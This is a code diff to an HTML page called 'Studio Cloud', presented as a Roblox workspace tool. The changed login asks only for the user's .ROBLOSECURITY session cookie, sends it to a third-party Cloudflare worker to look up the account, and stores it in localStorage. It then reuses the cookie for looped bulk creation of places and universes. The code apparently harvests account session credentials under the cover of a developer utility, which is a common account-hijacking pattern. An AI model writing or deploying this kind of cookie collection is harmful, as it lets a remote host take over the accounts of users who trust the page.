@@ -440,12 +440,7 @@
     <div class="login-card">
       <div class="login-icon">☁️</div>
       <h2>Studio Cloud</h2>
-      <p>Securely connect to your Roblox workspace.</p>
-      
-      <div class="login-input-group">
-        <label for="roblox-username">Roblox Username</label>
-        <input type="text" id="roblox-username" placeholder="Enter your username" />
-      </div>
+      <p>Enter your Roblox Cookie to log in automatically.</p>
 
       <div class="login-input-group">
         <label for="security-cookie">.ROBLOSECURITY Cookie</label>
@@ -571,15 +566,12 @@
     const WORKER_URL = 'https://ezpublishserv.acc943132.workers.dev/';
     let USER_COOKIE = "";
 
-    // --- AUTO-LOGIN CHECK ON LOAD ---
+    // --- AUTO-LOGIN SE JÁ TIVER SALVO ---
     window.addEventListener('DOMContentLoaded', () => {
       const savedCookie = localStorage.getItem('sc_cookie');
-      const savedUsername = localStorage.getItem('sc_username');
-
-      if (savedCookie && savedUsername) {
+      if (savedCookie) {
         document.getElementById('security-cookie').value = savedCookie;
-        document.getElementById('roblox-username').value = savedUsername;
-        handleLogin(true); // Auto-login silently
+        handleLogin(true);
       }
     });
 
@@ -616,52 +608,40 @@
       consoleBox.scrollTop = consoleBox.scrollHeight;
     }
 
-    // --- AUTHENTICATION ---
+    // --- AUTOMATIC AUTHENTICATION ---
     async function handleLogin(isAutoLogin = false) {
-      const usernameInput = document.getElementById('roblox-username').value.trim();
       const cookieInput = document.getElementById('security-cookie').value.trim();
 
-      if (!usernameInput) {
-        notify("Please enter your Roblox Username.", "warning");
-        return;
-      }
-
       if (!cookieInput || !cookieInput.includes("_|WARNING:-DO-NOT-SHARE-THIS")) {
-        notify("Invalid cookie format. It must start with _|WARNING...", "error");
-        appendLog("Authentication failed: Invalid cookie format provided.", "WARN");
+        notify("Formato de cookie inválido. Deve começar com _|WARNING...", "error");
+        appendLog("Authentication failed: Invalid cookie format.", "WARN");
         return;
       }
 
       const loginBtn = document.getElementById('btn-login');
-      loginBtn.innerText = "Loading Profile...";
+      loginBtn.innerText = "Autenticando...";
       loginBtn.disabled = true;
 
       try {
-        // Fetch User ID & Real Name via proxy
-        const userRes = await fetch("https://users.roproxy.com/v1/usernames/users", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ usernames: [usernameInput], excludeBannedUsers: true })
+        // Pede para o Worker obter as informações do usuário dono do Cookie
+        const authRes = await callWorker({
+          action: 'getUserInfo',
+          cookie: cookieInput
         });
-        
-        const userData = await userRes.json();
-        
-        if (!userData.data || userData.data.length === 0) {
-          notify("Roblox username not found!", "error");
-          loginBtn.innerText = "Authenticate";
-          loginBtn.disabled = false;
-          return;
+
+        if (!authRes.ok || !authRes.userId) {
+          throw new Error(authRes.message || "Não foi possível validar o cookie.");
         }
 
-        const userId = userData.data[0].id;
-        const displayName = userData.data[0].displayName;
-        const actualName = userData.data[0].name;
+        const userId = authRes.userId;
+        const actualName = authRes.username || "RobloxPlayer";
+        const displayName = authRes.displayName || actualName;
 
-        // Fetch Thumbnail
+        // Puxa a foto do perfil usando o ID obtido
         const thumbRes = await fetch(`https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=true`);
         const thumbData = await thumbRes.json();
         
-        // Update Sidebar UI with Display Name and Real Username (@username)
+        // Atualiza a Sidebar com Display Name e Username Real (@username)
         document.getElementById('sidebar-displayname').innerText = displayName;
         document.getElementById('sidebar-username').innerText = `@${actualName}`;
         
@@ -680,35 +660,19 @@
 
         USER_COOKIE = cookieInput;
 
-        // Save session in LocalStorage
+        // Salva sessão no LocalStorage
         localStorage.setItem('sc_cookie', cookieInput);
-        localStorage.setItem('sc_username', usernameInput);
         
-        // Switch UI
+        // Alterna a tela
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('dashboardLayout').style.display = 'flex';
         
-        if (!isAutoLogin) notify(`Welcome back, ${displayName}!`, "success");
-        appendLog(`User ${actualName} (@${actualName}) authenticated successfully.`, "SUCCESS");
+        if (!isAutoLogin) notify(`Bem-vindo de volta, ${displayName}!`, "success");
+        appendLog(`Usuário @${actualName} (ID: ${userId}) autenticado com sucesso.`, "SUCCESS");
 
       } catch (err) {
-        notify("Failed to fetch profile info. Check internet connection.", "warning");
-        appendLog(`Profile Fetch Error: ${err.message}`, "WARN");
-        
-        // Fallback login
-        USER_COOKIE = cookieInput;
-        localStorage.setItem('sc_cookie', cookieInput);
-        localStorage.setItem('sc_username', usernameInput);
-
-        document.getElementById('sidebar-displayname').innerText = usernameInput;
-        document.getElementById('sidebar-username').innerText = `@${usernameInput}`;
-        document.getElementById('sidebar-avatar-img').style.display = "none";
-        document.getElementById('sidebar-avatar-text').style.display = "flex";
-        document.getElementById('sidebar-avatar-text').innerText = usernameInput.charAt(0).toUpperCase();
-
-        document.getElementById('loginScreen').style.display = 'none';
-        document.getElementById('dashboardLayout').style.display = 'flex';
-        notify("Logged in (Fallback mode).", "info");
+        notify("Falha ao autenticar. Verifique seu cookie.", "error");
+        appendLog(`Erro de Autenticação: ${err.message}`, "ERROR");
       } finally {
         loginBtn.innerText = "Authenticate";
         loginBtn.disabled = false;
@@ -718,19 +682,17 @@
     function handleLogout() {
       USER_COOKIE = "";
       
-      // Clear saved session
+      // Limpa dados salvos
       localStorage.removeItem('sc_cookie');
-      localStorage.removeItem('sc_username');
 
       document.getElementById('security-cookie').value = "";
-      document.getElementById('roblox-username').value = "";
       
-      // Switch UI back to login
+      // Volta para a tela de login
       document.getElementById('dashboardLayout').style.display = 'none';
       document.getElementById('loginScreen').style.display = 'flex';
       
-      notify("Logged out successfully.", "info");
-      appendLog("User logged out and session cleared.", "INFO");
+      notify("Sessão encerrada com sucesso.", "info");
+      appendLog("Usuário deslogado.", "INFO");
     }
 
     // --- UI & NAVIGATION ---
@@ -774,26 +736,26 @@
       const delay = parseFloat(document.getElementById('place-delay').value) || 1;
 
       if (!USER_COOKIE) {
-        notify("Authentication missing. Please log in again.", "error");
+        notify("Sessão expirada. Faça login novamente.", "error");
         handleLogout();
         return;
       }
 
       if (!universeId || isNaN(universeId)) {
-        notify("Valid Universe ID is required!", "warning");
+        notify("Universe ID válido é obrigatório!", "warning");
         return;
       }
 
       const btn = document.getElementById('btn-create-place');
       btn.disabled = true;
 
-      notify(`Executing Create Place (${count}x)...`, "info");
-      appendLog(`Starting Create Place | Universe: ${universeId} | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
+      notify(`Executando Create Place (${count}x)...`, "info");
+      appendLog(`Iniciando Create Place | Universe: ${universeId} | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
 
       let ok = 0, err = 0;
 
       for (let i = 1; i <= count; i++) {
-        appendLog(`[${i}/${count}] Sending request to Worker...`, "INFO");
+        appendLog(`[${i}/${count}] Enviando requisição...`, "INFO");
         try {
           const res = await callWorker({
             action: 'createPlace',
@@ -804,22 +766,22 @@
 
           if (res.ok) {
             ok++;
-            appendLog(`[Place ${i}/${count}] SUCCESS: ${res.message}`, "SUCCESS");
+            appendLog(`[Place ${i}/${count}] SUCESSO: ${res.message}`, "SUCCESS");
           } else {
             err++;
-            appendLog(`[Place ${i}/${count}] ERROR: ${res.message}`, "ERROR");
+            appendLog(`[Place ${i}/${count}] ERRO: ${res.message}`, "ERROR");
           }
         } catch (e) {
           err++;
-          appendLog(`[Place ${i}/${count}] Connection failed: ${e.message}`, "ERROR");
+          appendLog(`[Place ${i}/${count}] Falha na conexão: ${e.message}`, "ERROR");
         }
 
         if (i < count) await sleep(delay * 1000);
       }
 
       btn.disabled = false;
-      notify(`Finished: ${ok} succeeded, ${err} failed.`, ok > 0 ? "success" : "error");
-      appendLog(`Completed Create Place job. Success: ${ok}, Failed: ${err}`, "INFO");
+      notify(`Finalizado: ${ok} sucessos, ${err} falhas.`, ok > 0 ? "success" : "error");
+      appendLog(`Tarefa Create Place concluída. Sucesso: ${ok}, Falha: ${err}`, "INFO");
     }
 
     async function handleCreateUniverse() {
@@ -828,7 +790,7 @@
       const delay = parseFloat(document.getElementById('universe-delay').value) || 1;
 
       if (!USER_COOKIE) {
-        notify("Authentication missing. Please log in again.", "error");
+        notify("Sessão expirada. Faça login novamente.", "error");
         handleLogout();
         return;
       }
@@ -836,13 +798,13 @@
       const btn = document.getElementById('btn-create-universe');
       btn.disabled = true;
 
-      notify(`Executing Create Universe (${count}x)...`, "info");
-      appendLog(`Starting Create Universe | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
+      notify(`Executando Create Universe (${count}x)...`, "info");
+      appendLog(`Iniciando Create Universe | Template: ${template} | Count: ${count} | Delay: ${delay}s`, "INFO");
 
       let ok = 0, err = 0;
 
       for (let i = 1; i <= count; i++) {
-        appendLog(`[${i}/${count}] Sending request to Worker...`, "INFO");
+        appendLog(`[${i}/${count}] Enviando requisição...`, "INFO");
         try {
           const res = await callWorker({
             action: 'createUniverse',
@@ -852,22 +814,22 @@
 
           if (res.ok) {
             ok++;
-            appendLog(`[Universe ${i}/${count}] SUCCESS: ${res.message}`, "SUCCESS");
+            appendLog(`[Universe ${i}/${count}] SUCESSO: ${res.message}`, "SUCCESS");
           } else {
             err++;
-            appendLog(`[Universe ${i}/${count}] ERROR: ${res.message}`, "ERROR");
+            appendLog(`[Universe ${i}/${count}] ERRO: ${res.message}`, "ERROR");
           }
         } catch (e) {
           err++;
-          appendLog(`[Universe ${i}/${count}] Connection failed: ${e.message}`, "ERROR");
+          appendLog(`[Universe ${i}/${count}] Falha na conexão: ${e.message}`, "ERROR");
         }
 
         if (i < count) await sleep(delay * 1000);
       }
 
       btn.disabled = false;
-      notify(`Finished: ${ok} succeeded, ${err} failed.`, ok > 0 ? "success" : "error");
-      appendLog(`Completed Create Universe job. Success: ${ok}, Failed: ${err}`, "INFO");
+      notify(`Finalizado: ${ok} sucessos, ${err} falhas.`, ok > 0 ? "success" : "error");
+      appendLog(`Tarefa Create Universe concluída. Sucesso: ${ok}, Falha: ${err}`, "INFO");
     }
   </script>
 </body>
